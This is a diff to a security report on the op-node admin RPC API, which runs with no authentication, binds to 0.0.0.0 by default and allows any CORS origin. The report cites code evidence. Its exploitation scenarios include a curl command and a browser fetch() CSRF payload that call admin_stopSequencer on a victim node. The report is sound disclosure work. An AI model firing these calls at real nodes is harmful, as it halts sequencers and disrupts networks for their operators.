@@ -13,9 +13,18 @@ op-node
 ## Description
 The op-node admin API exposes critical operational functions without any authentication mechanism. When enabled via `--rpc.enable-admin`, the admin namespace becomes accessible to anyone who can reach the RPC endpoint.
 
+**CRITICAL AGGRAVATING FACTORS:**
+1. **Default 0.0.0.0 Binding:** RPC server binds to ALL network interfaces by default, not localhost
+2. **CORS Wide Open:** All origins (`*`) are allowed for cross-origin requests
+3. **No Authentication:** Admin functions have no authentication layer
+
+This combination makes the admin API remotely exploitable when enabled.
+
 ## Affected Code Locations
-- `/home/user/optimism/op-node/node/api.go` lines 49-103
-- `/home/user/optimism/op-node/node/node.go` lines 477-482
+- `/home/user/optimism/op-node/node/api.go` lines 49-103 (Admin API implementation)
+- `/home/user/optimism/op-node/node/node.go` lines 477-482 (Admin API registration)
+- `/home/user/optimism/op-node/flags/flags.go` line 482 (0.0.0.0 default binding)
+- `/home/user/optimism/op-node/node/server.go` line 17 (CORS wildcard)
 
 ## Vulnerable Functions
 The following critical functions are exposed without authentication:
@@ -52,11 +61,36 @@ curl -X POST http://node-ip:port \
 ```
 
 ## Exploitation Scenario
-1. Attacker gains network access to the RPC endpoint (misconfiguration, internal network breach, or public exposure)
-2. Attacker calls `admin_stopSequencer` to halt block production (DoS)
-3. Attacker calls `admin_postUnsafePayload` with malicious payload
-4. Attacker calls `admin_overrideLeader` to bypass conductor safety checks
-5. Network disruption and potential chain state manipulation
+
+### Scenario 1: Direct Remote Attack (Most Severe)
+1. Operator enables admin API for operational needs (`--rpc.enable-admin`)
+2. **RPC binds to 0.0.0.0:9545 by default** (all interfaces)
+3. Attacker scans network and finds exposed RPC port
+4. Attacker makes direct RPC calls to admin functions:
+   ```bash
+   curl -X POST http://victim-node:9545 \
+     -H "Content-Type: application/json" \
+     -d '{"jsonrpc":"2.0","method":"admin_stopSequencer","params":[],"id":1}'
+   ```
+5. Sequencer halted, network disrupted
+
+### Scenario 2: Browser-Based CSRF Attack
+1. Admin API enabled and accessible on internal network
+2. **CORS set to `*` allows any origin**
+3. Attacker tricks operator into visiting malicious website
+4. Malicious JavaScript makes cross-origin requests:
+   ```javascript
+   fetch('http://internal-node:9545', {
+     method: 'POST',
+     body: JSON.stringify({
+       jsonrpc: '2.0',
+       method: 'admin_stopSequencer',
+       params: [],
+       id: 1
+     })
+   })
+   ```
+5. Attack succeeds despite browser same-origin policy
 
 ## Impact
 - **Denial of Service**: Ability to stop sequencer operations
@@ -65,6 +99,8 @@ curl -X POST http://node-ip:port \
 - **Operational Disruption**: Pipeline resets causing sync issues
 
 ## Evidence
+
+### 1. Admin API Exposed Without Authentication
 From `/home/user/optimism/op-node/node/node.go:477-482`:
 ```go
 if cfg.RPC.EnableAdmin {
@@ -75,8 +111,29 @@ if cfg.RPC.EnableAdmin {
     n.log.Info("Admin RPC enabled")
 }
 ```
-
 No authentication layer is added. The admin API is directly exposed.
+
+### 2. Default Binding to All Interfaces
+From `/home/user/optimism/op-node/flags/flags.go:481-484`:
+```go
+var rpcDefaults = oprpc.CLIConfig{
+    ListenAddr:  "0.0.0.0", // TODO(#16487): Switch to 127.0.0.1
+    ListenPort:  9545,
+    EnableAdmin: false,
+}
+```
+**RPC server binds to 0.0.0.0 by default!** There's even a TODO to fix this (#16487).
+
+### 3. CORS Wildcard Enabled
+From `/home/user/optimism/op-node/node/server.go:15-18`:
+```go
+server := oprpc.NewServer(rpcCfg.ListenAddr, rpcCfg.ListenPort, appVersion,
+    oprpc.WithLogger(log),
+    oprpc.WithCORSHosts([]string{"*"}), // CORS is not important on op-node...
+    oprpc.WithRPCRecorder(metrics.NewRecorder("main")),
+)
+```
+All origins are allowed, enabling CSRF attacks.
 
 From `/home/user/optimism/op-node/node/api.go:79-89`:
 ```go
